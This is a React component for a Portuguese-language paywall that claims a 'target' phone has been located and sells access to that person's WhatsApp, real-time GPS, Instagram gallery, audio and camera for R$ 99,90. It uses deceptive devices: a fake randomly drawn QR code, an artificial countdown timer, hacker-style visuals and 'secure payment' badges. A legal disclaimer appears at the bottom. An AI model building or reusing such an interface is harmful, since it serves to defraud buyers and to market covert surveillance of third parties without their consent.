import { useState, useEffect } from 'react';
import { Lock, QrCode, Copy, Check, AlertTriangle, Shield, Clock, CreditCard, ExternalLink } from 'lucide-react';
import { playSuccessBeep, playWarningBeep } from '@/lib/sounds';
import { supabase } from '@/integrations/supabase/client';
import MatrixRain from './MatrixRain';

interface PaywallScreenProps {
  onPaymentConfirmed: () => void;
  onCancel: () => void;
  targetPhone: string;
  targetName?: string;
}

const PaywallScreen = ({ onPaymentConfirmed, onCancel, targetPhone, targetName }: PaywallScreenProps) => {
  const [copied, setCopied] = useState(false);
  const [timeLeft, setTimeLeft] = useState(900); // 15 minutes in seconds
  const [isChecking, setIsChecking] = useState(false);
  const [checkAttempts, setCheckAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');
  const [kiwifyUrl, setKiwifyUrl] = useState('');

  // You can set your Kiwify checkout URL here
  const defaultKiwifyUrl = 'https://pay.kiwify.com.br/SEU_PRODUTO';

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Auto-check payment every 10 seconds
    const paymentChecker = setInterval(async () => {
      await checkPaymentSilently();
    }, 10000);

    return () => {
      clearInterval(timer);
      clearInterval(paymentChecker);
    };
  }, [targetPhone]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopyPix = () => {
    const pixCode = "00020126580014br.gov.bcb.pix0136a1b2c3d4-e5f6-7890-abcd-ef1234567890520400005303986540599.905802BR5925SISTEMA SENTINELA LTDA6009SAO PAULO62070503***6304A1B2";
    navigator.clipboard.writeText(pixCode);
    setCopied(true);
    playSuccessBeep();
    setTimeout(() => setCopied(false), 3000);
  };

  const checkPaymentSilently = async () => {
    try {
      const { data, error } = await supabase
        .from('payments')
        .select('*')
        .eq('phone_number', targetPhone)
        .eq('status', 'approved')
        .limit(1);

      if (data && data.length > 0) {
        playSuccessBeep();
        onPaymentConfirmed();
      }
    } catch (err) {
      console.error('Silent payment check error:', err);
    }
  };

  const handleCheckPayment = async () => {
    setIsChecking(true);
    setErrorMessage('');
    playWarningBeep();
    
    try {
      const { data, error } = await supabase
        .from('payments')
        .select('*')
        .eq('phone_number', targetPhone)
        .eq('status', 'approved')
        .limit(1);

      if (error) {
        console.error('Payment check error:', error);
        setErrorMessage('Erro ao verificar pagamento. Tente novamente.');
        setIsChecking(false);
        return;
      }

      if (data && data.length > 0) {
        playSuccessBeep();
        onPaymentConfirmed();
      } else {
        setCheckAttempts(prev => prev + 1);
        setErrorMessage('Pagamento não encontrado. Realize o pagamento e aguarde alguns segundos.');
        setIsChecking(false);
      }
    } catch (err) {
      console.error('Payment check error:', err);
      setErrorMessage('Erro de conexão. Tente novamente.');
      setIsChecking(false);
    }
  };

  const handleOpenKiwify = () => {
    const url = kiwifyUrl || defaultKiwifyUrl;
    window.open(url, '_blank');
  };

  const pixKey = "00020126580014br.gov.bcb.pix0136a1b2c3d4-e5f6-7890-abcd-ef1234567890520400005303986540599.905802BR5925SISTEMA SENTINELA LTDA6009SAO PAULO62070503***6304A1B2";

  return (
    <div className="min-h-screen bg-background scanlines flex items-center justify-center p-4">
      <MatrixRain />
      
      <div className="relative z-10 w-full max-w-lg">
        {/* Main Card */}
        <div className="module-card cut-corners-lg p-6 relative overflow-hidden">
          {/* Warning border animation */}
          <div className="absolute inset-0 border-2 border-warning/50 animate-border-pulse pointer-events-none" />
          
          {/* Header */}
          <div className="text-center mb-6">
            <div className="inline-flex items-center justify-center w-16 h-16 bg-warning/10 border-2 border-warning rounded-full mb-4">
              <Lock className="w-8 h-8 text-warning animate-pulse" />
            </div>
            <h2 className="text-xl font-bold text-warning uppercase tracking-wider mb-2" style={{ textShadow: '0 0 20px hsl(45 100% 50%)' }}>
              Acesso Restrito
            </h2>
            <p className="text-sm text-muted-foreground">
              Alvo localizado. Pagamento necessário para liberar monitoramento completo.
            </p>
          </div>

          {/* Target Info */}
          <div className="bg-muted/20 border border-border p-3 mb-6">
            <div className="flex items-center justify-between text-xs mb-2">
              <span className="text-muted-foreground">Número do Alvo:</span>
              <span className="text-destructive font-mono">{targetPhone}</span>
            </div>
            {targetName && (
              <div className="flex items-center justify-between text-xs mb-2">
                <span className="text-muted-foreground">Nome:</span>
                <span className="text-primary font-mono">{targetName}</span>
              </div>
            )}
            <div className="flex items-center justify-between text-xs">
              <span className="text-muted-foreground">Status:</span>
              <span className="text-warning font-mono flex items-center gap-1">
                <span className="w-2 h-2 bg-warning rounded-full animate-pulse" />
                AGUARDANDO LIBERAÇÃO
              </span>
            </div>
          </div>

          {/* Features to unlock */}
          <div className="grid grid-cols-2 gap-2 mb-6 text-xs">
            <div className="flex items-center gap-2 p-2 bg-primary/5 border border-primary/30">
              <span className="text-primary">📱</span>
              <span className="text-muted-foreground">WhatsApp Completo</span>
            </div>
            <div className="flex items-center gap-2 p-2 bg-secondary/5 border border-secondary/30">
              <span className="text-secondary">📍</span>
              <span className="text-muted-foreground">GPS em Tempo Real</span>
            </div>
            <div className="flex items-center gap-2 p-2 bg-pink-500/5 border border-pink-500/30">
              <span className="text-pink-500">📸</span>
              <span className="text-muted-foreground">Instagram/Galeria</span>
            </div>
            <div className="flex items-center gap-2 p-2 bg-warning/5 border border-warning/30">
              <span className="text-warning">🎤</span>
              <span className="text-muted-foreground">Áudio/Câmera</span>
            </div>
          </div>

          {/* Price */}
          <div className="text-center mb-6">
            <p className="text-xs text-muted-foreground uppercase mb-1">Valor Único</p>
            <p className="text-4xl font-bold text-primary" style={{ textShadow: '0 0 30px hsl(120 100% 55%)' }}>
              R$ 99,90
            </p>
            <p className="text-xs text-muted-foreground mt-1">Acesso vitalício • Sem mensalidades</p>
          </div>

          {/* QR Code */}
          <div className="bg-white rounded-lg p-4 mb-4 flex items-center justify-center">
            <div className="relative">
              {/* Fake QR Code pattern */}
              <div className="w-48 h-48 relative">
                <svg viewBox="0 0 100 100" className="w-full h-full">
                  {/* Generate fake QR pattern */}
                  {Array.from({ length: 20 }).map((_, row) =>
                    Array.from({ length: 20 }).map((_, col) => (
                      <rect
                        key={`${row}-${col}`}
                        x={col * 5}
                        y={row * 5}
                        width={5}
                        height={5}
                        fill={
                          // Corner patterns
                          (row < 7 && col < 7) ||
                          (row < 7 && col > 12) ||
                          (row > 12 && col < 7) ||
                          // Random fill for other cells
                          Math.random() > 0.5
                            ? '#000'
                            : '#fff'
                        }
                      />
                    ))
                  )}
                  {/* Corner squares */}
                  <rect x="0" y="0" width="35" height="35" fill="none" stroke="#000" strokeWidth="3" />
                  <rect x="5" y="5" width="25" height="25" fill="none" stroke="#000" strokeWidth="3" />
                  <rect x="10" y="10" width="15" height="15" fill="#000" />
                  
                  <rect x="65" y="0" width="35" height="35" fill="none" stroke="#000" strokeWidth="3" />
                  <rect x="70" y="5" width="25" height="25" fill="none" stroke="#000" strokeWidth="3" />
                  <rect x="75" y="10" width="15" height="15" fill="#000" />
                  
                  <rect x="0" y="65" width="35" height="35" fill="none" stroke="#000" strokeWidth="3" />
                  <rect x="5" y="70" width="25" height="25" fill="none" stroke="#000" strokeWidth="3" />
                  <rect x="10" y="75" width="15" height="15" fill="#000" />
                </svg>
                
                {/* Center logo */}
                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-12 h-12 bg-white border-2 border-black rounded-lg flex items-center justify-center">
                  <span className="text-2xl">🔓</span>
                </div>
              </div>
            </div>
          </div>

          {/* Kiwify Button */}
          <div className="mb-4">
            <button
              onClick={handleOpenKiwify}
              className="w-full py-4 font-mono text-sm uppercase tracking-wider font-bold border-2 bg-gradient-to-r from-primary/20 via-secondary/20 to-primary/20 border-secondary text-secondary hover:bg-secondary hover:text-background cut-corners-sm flex items-center justify-center gap-2 transition-all"
            >
              <ExternalLink className="w-5 h-5" />
              Pagar com Kiwify
            </button>
          </div>

          {/* PIX Key */}
          <div className="mb-4">
            <p className="text-xs text-muted-foreground uppercase mb-2 text-center">Ou copie o código PIX:</p>
            <div className="flex items-center gap-2">
              <div className="flex-1 bg-muted/30 border border-border p-2 font-mono text-[10px] text-muted-foreground truncate">
                {pixKey.substring(0, 50)}...
              </div>
              <button
                onClick={handleCopyPix}
                className={`px-3 py-2 border-2 font-mono text-xs uppercase transition-all flex items-center gap-1 ${
                  copied 
                    ? 'bg-primary border-primary text-background' 
                    : 'border-primary text-primary hover:bg-primary hover:text-background'
                }`}
              >
                {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                {copied ? 'Copiado!' : 'Copiar'}
              </button>
            </div>
          </div>

          {/* Timer */}
          <div className="flex items-center justify-center gap-2 mb-6 text-warning">
            <Clock className="w-4 h-4" />
            <span className="font-mono text-sm">
              {timeLeft > 0 ? `Oferta expira em: ${formatTime(timeLeft)}` : 'Oferta expirada!'}
            </span>
          </div>

          {/* Error Message */}
          {errorMessage && (
            <div className="mb-4 p-2 bg-destructive/10 border border-destructive text-xs text-destructive text-center animate-pulse">
              {errorMessage}
            </div>
          )}

          {/* Actions */}
          <div className="space-y-3">
            <button
              onClick={handleCheckPayment}
              disabled={isChecking}
              className={`w-full py-4 font-mono text-sm uppercase tracking-wider font-bold border-2 cut-corners-sm flex items-center justify-center gap-2 transition-all ${
                isChecking
                  ? 'bg-warning/20 border-warning text-warning'
                  : 'bg-primary/10 border-primary text-primary hover:bg-primary hover:text-background border-glow'
              }`}
            >
              {isChecking ? (
                <>
                  <span className="animate-spin">◐</span>
                  Verificando Pagamento...
                </>
              ) : (
                <>
                  <CreditCard className="w-5 h-5" />
                  Já Paguei - Liberar Acesso {checkAttempts > 0 && `(${checkAttempts})`}
                </>
              )}
            </button>
            
            <button
              onClick={onCancel}
              className="w-full py-2 font-mono text-xs uppercase tracking-wider text-muted-foreground hover:text-foreground transition-all"
            >
              Cancelar Operação
            </button>
          </div>

          {/* Security badges */}
          <div className="mt-6 pt-4 border-t border-border flex items-center justify-center gap-4 text-xs text-muted-foreground">
            <span className="flex items-center gap-1">
              <Shield className="w-3 h-3 text-primary" />
              Pagamento Seguro
            </span>
            <span className="flex items-center gap-1">
              <Lock className="w-3 h-3 text-primary" />
              Dados Criptografados
            </span>
          </div>
        </div>

        {/* Warning */}
        <div className="mt-4 p-3 bg-destructive/10 border border-destructive/30 flex items-start gap-2">
          <AlertTriangle className="w-4 h-4 text-destructive flex-shrink-0 mt-0.5" />
          <p className="text-xs text-destructive/80">
            Este sistema é destinado apenas para uso legal e autorizado. O uso indevido pode resultar em penalidades legais.
          </p>
        </div>
      </div>
    </div>
  );
};

export default PaywallScreen;
